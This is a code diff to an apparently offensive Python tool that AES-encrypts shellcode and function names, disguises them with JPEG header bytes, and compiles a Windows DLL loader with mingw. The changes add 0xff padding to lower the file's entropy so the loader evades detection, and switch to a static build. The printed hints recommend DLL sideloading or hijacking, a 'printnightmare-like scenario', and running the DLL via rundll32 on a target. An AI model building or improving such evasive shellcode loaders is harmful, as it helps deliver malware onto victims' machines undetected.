@@ -40,26 +40,40 @@ def makeHeaderFile(payload):
     encKey = f'#define KEY { ', '.join('0x{:02x}'.format(b) for b in bytearray(KEY))}\n'
 
     # payload
-    encPayload = f'#define PAYLOAD {', '.join('0x{:02x}'.format(b) for b in JPG_HEAD + aesenc(payload, KEY) + JPG_TAIL)}\n'
+    encPayload = aesenc(payload, KEY)
+    encPayloadDef = f'#define PAYLOAD {',0x00,'.join('0x{:02x}'.format(b) for b in JPG_HEAD + encPayload + JPG_TAIL)}\n'
+    encPayloadEntropyDef = f'#define LOWER_PAYLOAD_ENTROPY {','.join(['0xff']* len(encPayload))}\n'
 
     print(encKey, end='')
     print(encPayload, end='')
 
     # funcName
-    print("\nEncrypting functions:\n")
-    encFuncList = []
+    print("\n\nEncrypting functions:")
+    encFuncDefList = []
+    
+    # lower func entropy
+    encFuncEntropyLen = 0
+    
     for f in funcList:
-        encFunc = f'#define {f.upper().rstrip('\0')} {', '.join(('0x{:02x}'.format(b) for b in JPG_HEAD + aesenc(f.encode(), KEY) + JPG_TAIL))}\n'
-        print(encFunc, end='')
-        encFuncList.append(encFunc)
+        encFunc = aesenc(f.encode(), KEY)
+        encFuncDef = f'#define {f.upper().rstrip('\0')} {', '.join(('0x{:02x}'.format(b) for b in JPG_HEAD + encFunc + JPG_TAIL))}\n'
+        print(encFuncDef, end='')
+        encFuncDefList.append(encFuncDef)
+        encFuncEntropyLen += len(encFunc)
+
 
     # payload and funcname offset
     offsetHead = f'#define OFFSET_HEAD {str(len(JPG_HEAD))}\n'
     offsetTail = f'#define OFFSET_TAIL {str(len(JPG_TAIL))}\n'
 
+    # insert 0 to lower the entropy by the length of encrypted func name
+    encFuncEntropyDef = f'#define LOWER_FUNCNAME_ENTROPY {','.join(['0xff']*encFuncEntropyLen)}\n'
+
     f = open("shellcode.h","w")
-    f.write(encKey+encPayload + offsetHead + offsetTail +''.join(encFuncList))
+    f.write(encKey+encPayloadDef + offsetHead + offsetTail +''.join(encFuncDefList) + encFuncEntropyDef + encPayloadEntropyDef )
     f.close()
+    print()
+
 
 # x86_64-w64-mingw32-gcc template.cpp --shared -o test_ns.dll -lcrypt32 -O2 -fvisibility=hidden -Wl,--dynamicbase -Wl,--nxcompat -DNDEBUG -s
 def main():
@@ -103,13 +117,13 @@ python ShellcodeEncrypt2Dll.py --standalone shellcode.raw
 
     if args.standalone:
         print("STANDALONE mode")
-        command = ['x86_64-w64-mingw32-g++', 'template.cpp', '--shared', '-O0', '-fvisibility=hidden', '-DSTANDALONE', '-fpermissive', '-Wl,--dynamicbase', '-Wl,--nxcompat', '-DNDEBUG', '-s', '-o', 'shell.dll']
+        command = ['x86_64-w64-mingw32-g++', 'template.cpp', '--shared', '-O0', '-fvisibility=hidden', '-static-libgcc', '-static-libstdc++', '-static',  '-DSTANDALONE', '-fpermissive', '-Wl,--dynamicbase', '-Wl,--nxcompat', '-DNDEBUG', '-s', '-o', 'loader.dll']
         print("You can use it for sideload/hijack or in a printnightmare-like scenario.")
         print("Or just simply: rundll32 <path_to_dll>,EPoint")
 
     elif args.non_standalone:
         print("NON-STANDALONE mode:")
-        command = ['x86_64-w64-mingw32-g++', 'template.cpp', '--shared', '-O0', '-fvisibility=hidden', '-Wl,--dynamicbase', '-fpermissive','-Wl,--nxcompat', '-DNDEBUG', '-s', '-o', 'shell.dll']        
+        command = ['x86_64-w64-mingw32-g++', 'template.cpp', '--shared', '-O0', '-fvisibility=hidden','-static-libgcc', '-static-libstdc++', '-static',  '-Wl,--dynamicbase', '-fpermissive','-Wl,--nxcompat', '-DNDEBUG', '-s', '-o', 'loader.dll']        
         print(f"Try to run on target: rundll32 <path_to_dll>,EPoint {KEY.decode()}")
     try:
         print("[+] Compiling")
@@ -118,7 +132,7 @@ python ShellcodeEncrypt2Dll.py --standalone shellcode.raw
             print("[-] Compile Failure:")
             print(result.stderr)
         else:
-            print("[+] Done: shell.dll")
+            print("[+] Done: loader.dll")
             print(result.stdout)
             
     except FileNotFoundError:
